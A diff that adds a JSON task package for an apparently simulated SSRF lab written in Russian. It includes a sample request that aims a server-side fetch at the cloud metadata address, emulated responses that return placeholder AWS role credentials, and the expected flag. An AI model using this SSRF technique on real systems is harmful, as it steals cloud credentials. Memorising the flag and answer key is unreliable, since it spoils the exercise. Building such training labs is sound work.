@@ -1,0 +1,67 @@
+{
+  "id": "cloud-metadata-ssrf",
+  "workdir": "/home/student/ssrf",
+  "expect": {
+    "file": "/home/student/ssrf/found.txt",
+    "contains": "nto{1mds_1s_4_g0ldm1n3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/ssrf",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/ssrf/task.md",
+      "text": "# Задача: SSRF → metadata-сервис\n\nПриложение (`/api/fetch?url=...`) делает серверный HTTP-запрос по переданному\nURL. Тебе дали пример запроса в `ssrf-request.txt`. Нужно прочитать metadata-сервис\nинстанса (IMDS), захватить роль и достать флаг из user-data.\n\nКоманда `curl` эмулируется: её ответы захвачены с IMDS-совместимого эндпоинта\n(адрес `169.254.169.254`).\n\nПолезные команды: `cat`, `grep`, `cut`, `curl`.\n\nФлаг — в `found.txt`, затем `check`.\n"
+    },
+    {
+      "path": "/home/student/ssrf/notes.md",
+      "text": "Заметки\n------\n- Приложение принимает параметр `url` и делает GET без валидации.\n- Инстанс — EC2 с прикреплённой ролью (instance profile).\n- В user-data cloud-init остаётся читаемым через IMDS.\n"
+    },
+    {
+      "path": "/home/student/ssrf/ssrf-request.txt",
+      "text": "POST /api/fetch HTTP/1.1\nHost: app.acme.example\nContent-Type: application/json\n\n{\"url\":\"http://169.254.169.254/latest/meta-data/\"}\n"
+    }
+  ],
+  "vars": {
+    "target": "169.254.169.254"
+  },
+  "tools": {
+    "curl": {
+      "help": "curl [-s] <url> — HTTP-запрос (эмуляция: ответы захвачены с IMDS-совместимого эндпоинта 169.254.169.254)",
+      "cases": [
+        {
+          "match": "user-data",
+          "example": "http://{{target}}/latest/user-data",
+          "output": "#cloud-config\npackage_update: true\nruncmd:\n  - /opt/acme/provision.sh --region eu-central-1\n  - echo 'nto{1mds_1s_4_g0ldm1n3}' > /root/flag.txt\n"
+        },
+        {
+          "match": "iam/security-credentials/ec2-admin-role",
+          "example": "http://{{target}}/latest/meta-data/iam/security-credentials/ec2-admin-role",
+          "output": "{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2026-09-14T03:20:11Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjEGQaCWV1LXdlc3QtMSJHMEUCIE\",\n  \"Expiration\": \"2026-09-14T09:20:11Z\"\n}\n"
+        },
+        {
+          "match": "iam/security-credentials/?",
+          "example": "http://{{target}}/latest/meta-data/iam/security-credentials/",
+          "output": "ec2-admin-role\n"
+        },
+        {
+          "match": "meta-data/iam/info",
+          "example": "http://{{target}}/latest/meta-data/iam/info",
+          "output": "{\n  \"Code\" : \"Success\",\n  \"InstanceProfileArn\" : \"arn:aws:iam::111122223333:instance-profile/ec2-admin-role\",\n  \"InstanceProfileId\" : \"AIPAEXAMPLE\"\n}\n"
+        },
+        {
+          "match": "instance-id",
+          "example": "http://{{target}}/latest/meta-data/instance-id",
+          "output": "i-0abc123def456789\n"
+        },
+        {
+          "match": "meta-data/?\\s*$",
+          "example": "http://{{target}}/latest/meta-data/",
+          "output": "ami-id\nami-launch-index\nhostname\ninstance-id\ninstance-type\nlocal-ipv4\nplacement/\niam/\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа в лабе. Доступные пути:\n  /latest/meta-data/\n  /latest/meta-data/iam/security-credentials/\n  /latest/meta-data/iam/security-credentials/ec2-admin-role\n  /latest/user-data\n"
+    }
+  }
+}
